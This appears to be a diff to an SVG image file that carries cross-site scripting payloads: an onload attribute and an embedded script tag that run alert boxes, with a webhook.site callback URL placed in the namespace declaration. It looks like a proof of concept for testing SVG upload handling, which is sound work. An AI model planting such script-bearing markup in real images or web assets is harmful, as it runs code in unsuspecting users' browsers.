@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg"
-    xmlns:xlink="https://webhook.site/c2fc30bc-e530-40c0-9731-0beced67cec7" width="512" height="512" xml:space="preserve" overflow="hidden" onload=alert('XSS')>
+    xmlns:xlink="https://webhook.site/c2fc30bc-e530-40c0-9731-0beced67cec7" width="512" height="512" xml:space="preserve" overflow="hidden" onload="alert('XSS')">
     <script>alert(1)</script>
     <g transform="translate(-384 -104)">
         <g>
